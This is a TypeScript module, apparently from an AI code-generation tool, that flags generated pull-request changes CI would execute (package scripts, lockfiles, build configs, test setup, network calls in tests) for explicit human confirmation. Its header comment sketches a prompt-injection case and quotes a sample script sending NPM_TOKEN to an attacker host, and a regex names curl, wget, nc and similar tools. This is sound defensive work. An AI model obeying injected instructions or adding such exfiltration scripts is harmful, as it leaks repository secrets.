/**
 * Changes that run in the repository's CI before anyone reviews them (#400). A draft pull request is pushed into the
 * customer's own repository, so `pull_request` workflows run on it with the repository's secrets. Generated code that
 * was steered by a prompt injection (an attached document, a repository file) could add, for example,
 * `"test": "curl https://attacker/?k=$NPM_TOKEN"`. `.github/` is already blocked (workspace.ts); these are the other
 * files a CI run executes. The person creating the pull request sees them listed and confirms them explicitly.
 */

export type CiRiskReason = "package_scripts" | "lockfile" | "build_config" | "test_setup" | "network_call";

export interface CiRisk {
  path: string;
  reason: CiRiskReason;
  /** Short, human-readable detail (changed script names, the added network command). */
  detail?: string;
}

const LOCKFILES = /(^|\/)(package-lock\.json|npm-shrinkwrap\.json|pnpm-lock\.yaml|yarn\.lock|bun\.lockb?|poetry\.lock|Pipfile\.lock|uv\.lock|Cargo\.lock|go\.sum|Gemfile\.lock|composer\.lock)$/;
const BUILD_CONFIG =
  /(^|\/)(Makefile|Dockerfile|docker-compose\.ya?ml|compose\.ya?ml|\.npmrc|\.yarnrc(\.yml)?|\.pnpmfile\.cjs|pyproject\.toml|setup\.py|setup\.cfg|tox\.ini|noxfile\.py|Pipfile|requirements[\w.-]*\.txt|build\.gradle(\.kts)?|pom\.xml|Rakefile|Gemfile|justfile|Taskfile\.ya?ml|turbo\.json|nx\.json|[\w.-]+\.config\.(js|cjs|mjs|ts|cts|mts))$/;
const TEST_SETUP = /(^|\/)(conftest\.py|pytest\.ini|jest\.setup\.[cm]?[jt]s|vitest\.setup\.[cm]?[jt]s|setupTests\.[cm]?[jt]sx?|global-setup\.[cm]?[jt]s)$/;
const SCRIPT_DIR = /(^|\/)(scripts|bin|\.husky)\//;
const TEST_FILE = /(^|\/)(__tests__|tests?|spec)\/|\.(test|spec)\.[cm]?[jt]sx?$|(^|\/)test_[\w-]+\.py$|_test\.(py|go)$/;
/** Commands and APIs that send data out of a CI job. */
const NETWORK = /\b(curl|wget|nc|ncat|Invoke-WebRequest|XMLHttpRequest)\b|\b(fetch|axios(\.\w+)?|requests\.(get|post|put)|urlopen|https?\.(request|get))\s*\(/;

function scripts(json: string | null): Record<string, string> {
  if (!json) return {};
  try {
    const parsed = JSON.parse(json) as { scripts?: Record<string, unknown> };
    return Object.fromEntries(Object.entries(parsed.scripts ?? {}).map(([k, v]) => [k, String(v)]));
  } catch {
    return {};
  }
}

/** Lines of `after` that are not in `before` (a cheap set difference; enough to spot an added network command). */
function addedLines(before: string | null, after: string): string[] {
  const old = new Set((before ?? "").split("\n").map((l) => l.trim()));
  return after.split("\n").filter((l) => l.trim() && !old.has(l.trim()));
}

export function ciRisks(changes: ReadonlyArray<{ path: string; before: string | null; after: string | null }>): CiRisk[] {
  const risks: CiRisk[] = [];
  for (const change of changes) {
    const { path, before, after } = change;
    if (after === null) continue; // a deletion runs nothing
    if (/(^|\/)package\.json$/.test(path)) {
      const was = scripts(before);
      const now = scripts(after);
      const changed = Object.keys(now).filter((k) => was[k] !== now[k]);
      if (changed.length) risks.push({ path, reason: "package_scripts", detail: changed.slice(0, 8).join(", ") });
      continue;
    }
    if (LOCKFILES.test(path)) {
      risks.push({ path, reason: "lockfile" });
      continue;
    }
    if (BUILD_CONFIG.test(path) || SCRIPT_DIR.test(path)) {
      risks.push({ path, reason: "build_config" });
      continue;
    }
    if (TEST_SETUP.test(path)) {
      risks.push({ path, reason: "test_setup" });
      continue;
    }
    if (TEST_FILE.test(path)) {
      const call = addedLines(before, after).find((line) => NETWORK.test(line));
      if (call) risks.push({ path, reason: "network_call", detail: call.trim().slice(0, 160) });
    }
  }
  return risks;
}

/** One line per risk for the pull request body and error messages. */
export function describeCiRisk(risk: CiRisk): string {
  const what: Record<CiRiskReason, string> = {
    package_scripts: "package.json scripts changed",
    lockfile: "lockfile changed (dependencies are installed in CI)",
    build_config: "build/CI configuration or script changed",
    test_setup: "test setup changed (runs before every test)",
    network_call: "test adds a network call",
  };
  return `\`${risk.path}\`: ${what[risk.reason]}${risk.detail ? ` – ${risk.detail}` : ""}`;
}
